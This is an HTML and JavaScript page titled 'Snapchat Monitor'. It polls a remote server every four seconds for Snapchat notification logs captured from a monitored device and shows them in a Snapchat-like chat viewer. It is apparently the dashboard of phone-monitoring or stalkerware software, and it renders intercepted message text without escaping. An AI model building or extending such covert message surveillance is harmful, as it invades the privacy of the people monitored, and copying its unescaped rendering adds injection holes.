<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Snapchat Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- SNAPCHAT THEME CSS --- */
        body { 
            margin: 0; 
            background-color: #f2f2f2; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; 
            height: 100vh; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
        }

        .app-container {
            width: 100%;
            height: 100%;
            max-width: 450px;
            background-color: #fff;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
        }

        /* --- VIEW 1: CHAT LIST --- */
        #snapListScreen { display: flex; flex-direction: column; height: 100%; width: 100%; }
        
        .snap-header { 
            background: #fff; 
            padding: 10px 15px; 
            border-bottom: 1px solid #f0f0f0; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            height: 50px;
        }
        
        /* ðŸ”¥ NEW BACK BUTTON STYLE */
        .header-left { display: flex; align-items: center; gap: 10px; cursor: pointer; }
        .back-arrow-main { font-size: 1.2rem; color: #222; margin-right: 5px; }

        .avatar-small { 
            width: 40px; height: 40px; 
            border-radius: 50%; 
            overflow: hidden; 
            display: flex; justify-content: center; align-items: center;
            font-weight: bold; color: rgba(0,0,0,0.5); font-size: 1.2rem;
        }
        
        .page-title { font-weight: 700; font-size: 1.3rem; color: #000; flex: 1; text-align: center; }
        .header-right { display: flex; gap: 15px; color: #444; font-size: 1.2rem; }

        .friend-list { flex: 1; overflow-y: auto; }
        
        .friend-row { 
            display: flex; align-items: center; 
            padding: 8px 15px; 
            border-bottom: 1px solid #fafafa; 
            cursor: pointer; 
            height: 64px;
        }
        .friend-row:active { background: #f8f8f8; }

        .bitmoji { 
            width: 48px; height: 48px; margin-right: 12px; 
            border-radius: 50%; 
            overflow: hidden; display: flex; align-items: center; justify-content: center; 
            font-size: 1.4rem; color: #fff; text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        
        .friend-data { flex: 1; display: flex; flex-direction: column; justify-content: center; overflow: hidden; }
        .friend-data h3 { margin: 0; font-size: 1.1rem; font-weight: 600; color: #000; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        
        .status-row { display: flex; align-items: center; gap: 6px; margin-top: 3px; }
        
        /* ðŸ”¥ REAL SNAPCHAT STATUS ICONS */
        .status-box { width: 10px; height: 10px; border-radius: 2px; display: inline-block; margin-right: 2px;}
        .status-bubble { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 2px; border: 2px solid transparent;}
        
        .st-red { background-color: #F23C57; } /* Red Square (Snap) */
        .st-blue { background-color: #3CB2E2; } /* Blue Bubble (Chat) */
        .st-purple { background-color: #9B55A0; } /* Purple (Video) */
        
        .st-text { font-size: 0.85rem; color: #657786; font-weight: 400; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden; }
        .st-time { font-size: 0.85rem; color: #657786; margin-left: 5px; position: relative; padding-left: 5px;}
        .st-time::before { content: "â€¢"; position: absolute; left: -2px; color: #ddd; }

        .cam-btn { 
            width: 40px; height: 40px; border-radius: 50%; 
            display: flex; justify-content: center; align-items: center; 
            color: #ccc; font-size: 1.2rem; border-left: 1px solid #fafafa;
        }

        /* --- VIEW 2: CHAT CONVERSATION --- */
        #snapChatScreen { 
            display: none; 
            flex-direction: column; height: 100%; 
            background: #fff; 
            position: absolute; top: 0; left: 0; width: 100%; 
            z-index: 20; 
        }
        
        .chat-top { 
            padding: 10px; border-bottom: 1px solid #f0f0f0; 
            display: flex; align-items: center; gap: 10px; height: 50px;
        }
        .chat-name { font-weight: 700; font-size: 1.1rem; flex: 1; color: #000; }
        
        .snap-msgs { 
            flex: 1; padding: 15px; overflow-y: auto; 
            display: flex; flex-direction: column; gap: 4px; 
        }
        
        .s-msg { 
            padding: 8px 12px; 
            max-width: 75%; 
            font-size: 1.05rem; 
            position: relative;
            background: #fff;
            color: #000;
            border-left: 3px solid #eee;
            margin-bottom: 5px;
            cursor: pointer;
            transition: 0.2s;
        }
        .s-msg:hover { background: #f9f9f9; }
        
        .s-in { align-self: flex-start; }
        .s-time-float { font-size: 0.65rem; color: #ccc; display: block; margin-top: 2px;}

        .chat-bottom { padding: 10px; border-top: 1px solid #eee; display: flex; align-items: center; gap: 10px; background: #fff; }
        .snap-input { flex: 1; background: #eee; border: none; padding: 12px 20px; border-radius: 20px; outline: none; font-size: 1rem; }

        .bottom-nav { 
            height: 60px; border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; background: #fff; 
        }
        .nav-item { font-size: 1.4rem; color: #aaa; }
        .nav-active { color: #3CB2E2; } /* Snapchat Blue */

    </style>
</head>
<body>

    <div class="app-container">

        <div id="snapListScreen">
            <div class="snap-header">
                <div class="header-left" onclick="window.location.href='index.html'">
                    <i class="fa-solid fa-chevron-left back-arrow-main"></i>
                    <div class="avatar-small" style="background: #eee;">
                        <i class="fa-solid fa-user"></i>
                    </div>
                </div>
                
                <div class="page-title">Chat</div>
                
                <div class="header-right">
                    <i class="fa-solid fa-user-plus"></i>
                    <i class="fa-solid fa-ellipsis"></i>
                </div>
            </div>

            <div class="friend-list" id="snapContainer">
                <div style="display:flex; justify-content:center; align-items:center; height:200px; color:#ccc;">
                    <i class="fa-solid fa-ghost fa-bounce" style="font-size:2rem; margin-right:10px;"></i> Loading...
                </div>
            </div>

            <div class="bottom-nav">
                <div class="nav-item"><i class="fa-solid fa-location-dot"></i></div>
                <div class="nav-item nav-active"><i class="fa-solid fa-message"></i></div>
                <div class="nav-item"><i class="fa-solid fa-camera" style="font-size:1.8rem; color:#FFFC00; -webkit-text-stroke: 1px #ddd;"></i></div>
                <div class="nav-item"><i class="fa-solid fa-user-group"></i></div>
                <div class="nav-item"><i class="fa-solid fa-play"></i></div>
            </div>
        </div>

        <div id="snapChatScreen">
            <div class="chat-top">
                <i class="fa-solid fa-chevron-left" style="font-size:1.5rem; color:#222; cursor:pointer; padding:5px; margin-right: 5px;" onclick="closeSnap()"></i>
                <div class="bitmoji" id="chatAvatar" style="width:35px; height:35px; font-size:1rem; margin-right:8px;">ðŸ‘»</div>
                <div class="chat-name" id="snapName">Friend</div>
                <i class="fa-solid fa-phone" style="font-size:1rem; color:#444; margin-right:15px; background:#f0f0f0; padding:10px; border-radius:50%"></i>
                <i class="fa-solid fa-video" style="font-size:1rem; color:#444; background:#f0f0f0; padding:10px; border-radius:50%"></i>
            </div>
            
            <div class="snap-msgs" id="snapMsgsBox">
            </div>

            <div class="chat-bottom">
                <i class="fa-solid fa-camera" style="color:#222; font-size:1.2rem; background:#f0f0f0; padding:10px; border-radius:50%"></i>
                <input type="text" class="snap-input" placeholder="Send a chat">
                <i class="fa-solid fa-microphone" style="color:#222; font-size:1.2rem; margin-left: 5px;"></i>
            </div>
        </div>

    </div>

    <script>
        // --- CONFIG & LOGIC ---
        const DEVICE_ID = localStorage.getItem('monitoring_id'); // Ensure this is set in index.html
        const BASE_URL = "https://child-v9no.onrender.com/api/get-data";
        
        const DATA_TYPE = "snapchat"; // Specific request for snapchat logs

        if (!DEVICE_ID) {
            alert("Device ID missing! Redirecting...");
            window.location.href = 'index.html'; 
        }

        let groupedSnaps = {};
        let isFetching = false;

        // --- ðŸŽ¨ UTILITY: Random Color for Avatar ---
        function getAvatarColor(name) {
            const colors = ['#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEEAD', '#D4A5A5', '#9B59B6', '#3498DB'];
            let hash = 0;
            for (let i = 0; i < name.length; i++) {
                hash = name.charCodeAt(i) + ((hash << 5) - hash);
            }
            return colors[Math.abs(hash) % colors.length];
        }

        function getInitials(name) {
            return name.substring(0, 1).toUpperCase();
        }

        // 1. Fetch Data
        async function fetchSnapData() {
            if(isFetching) return;
            isFetching = true;

            try {
                const response = await fetch(`${BASE_URL}/${DEVICE_ID}/${DATA_TYPE}?t=${Date.now()}`);
                const result = await response.json();

                if (Array.isArray(result) && result.length > 0) {
                    processSnapData(result);
                } else {
                    document.getElementById('snapContainer').innerHTML = "<div style='text-align:center; padding:50px; color:#ccc'><i class='fa-solid fa-box-open' style='font-size:2rem'></i><br>No Chats Yet</div>";
                }
            } catch (error) {
                console.error("Error fetching data:", error);
            } finally {
                isFetching = false;
            }
        }

        // 2. Process & Group Data
        function processSnapData(logs) {
            // Sort by time ascending
            logs.sort((a, b) => (a.time || 0) - (b.time || 0));

            const tempGroup = {};

            logs.forEach(log => {
                let rawTitle = (log.title || "").trim();
                let rawText = (log.text || "").trim();
                let time = log.time || Date.now();

                // ðŸ—‘ï¸ Garbage Filter
                if(rawText.includes("is typing") || rawText.includes("Updating") || rawText === "New Snap") return;

                let senderName = "Unknown";
                let messageBody = rawText;

                // --- LOGIC: NAME DETECTION ---
                if (rawTitle === "Snapchat") {
                    if (rawText.includes(":")) {
                        let parts = rawText.split(":");
                        senderName = parts[0].trim();
                        messageBody = parts.slice(1).join(":").trim();
                    } else if (rawText.toLowerCase().includes("snap")) {
                         senderName = "Snap Team";
                    } else {
                        senderName = "Snapchat";
                    }
                } else {
                    senderName = rawTitle;
                }

                if (!tempGroup[senderName]) {
                    tempGroup[senderName] = {
                        name: senderName,
                        lastMsg: "",
                        lastTime: 0,
                        msgs: []
                    };
                }

                tempGroup[senderName].msgs.push({
                    text: messageBody,
                    timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                    rawTime: time
                });

                tempGroup[senderName].lastMsg = messageBody;
                tempGroup[senderName].lastTime = time;
            });

            // Compare with old data to avoid re-rendering if same
            if(JSON.stringify(groupedSnaps) !== JSON.stringify(tempGroup)) {
                groupedSnaps = tempGroup;
                renderSnaps();
            }
        }

        // 3. Render List (With Scroll Fix)
        function renderSnaps() {
            const con = document.getElementById('snapContainer');
            const users = Object.keys(groupedSnaps);
            
            // ðŸ”¥ Save Scroll Position
            const scrollPos = con.scrollTop;

            if(users.length === 0) return;

            // Sort: Newest chats at top
            users.sort((a, b) => groupedSnaps[b].lastTime - groupedSnaps[a].lastTime);

            let html = "";
            users.forEach(user => {
                const s = groupedSnaps[user];
                
                // Styling based on message type
                let statusHtml = `<span class="status-box st-red"></span> <span class="st-text" style="color:#F23C57; font-weight:600">New Snap</span>`;
                
                // Logic: If message contains 'chat' -> Blue, else Red
                if (!s.lastMsg.toLowerCase().includes("snap")) {
                    statusHtml = `<span class="status-bubble st-blue" style="background:#3CB2E2"></span> <span class="st-text" style="color:#3CB2E2; font-weight:600">New Chat</span>`;
                }

                // Avatar Color
                const avatarColor = getAvatarColor(user);
                const initial = getInitials(user);

                html += `
                    <div class="friend-row" onclick="openSnap('${user}', '${avatarColor}')">
                        <div class="bitmoji" style="background: ${avatarColor};">
                            ${initial}
                        </div>
                        <div class="friend-data">
                            <h3>${s.name}</h3>
                            <div class="status-row">
                                ${statusHtml}
                                <span class="st-text" style="color:#999; margin-left:5px;">â€¢ ${s.lastMsg}</span>
                                <span class="st-time">${new Date(s.lastTime).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
                            </div>
                        </div>
                        <div class="cam-btn"><i class="fa-regular fa-comment-dots"></i></div>
                    </div>`;
            });
            
            con.innerHTML = html;
            
            // ðŸ”¥ Restore Scroll Position
            con.scrollTop = scrollPos;
        }

        // 4. Open Chat
        function openSnap(userName, color) {
            const s = groupedSnaps[userName];
            
            if(s) {
                document.getElementById('snapName').innerText = s.name;
                document.getElementById('chatAvatar').innerText = getInitials(s.name);
                document.getElementById('chatAvatar').style.background = color;
                
                const box = document.getElementById('snapMsgsBox');
                box.innerHTML = "";
                
                s.msgs.forEach(m => {
                    // Chat Border Logic
                    let borderStyle = "border-left: 3px solid #3CB2E2;"; // Blue
                    if(m.text.toLowerCase().includes("snap")) borderStyle = "border-left: 3px solid #F23C57;"; // Red

                    box.innerHTML += `
                        <div class="s-msg s-in" style="${borderStyle}">
                            ${m.text}
                            <span class="s-time-float">${m.timeStr}</span>
                        </div>`;
                });

                document.getElementById('snapListScreen').style.display = 'none';
                document.getElementById('snapChatScreen').style.display = 'flex';
                box.scrollTop = box.scrollHeight;
            }
        }

        function closeSnap() {
            document.getElementById('snapChatScreen').style.display = 'none';
            document.getElementById('snapListScreen').style.display = 'flex';
        }

        // Auto Refresh
        fetchSnapData();
        setInterval(fetchSnapData, 4000); // 4 Seconds Refresh

    </script>
</body>
</html>
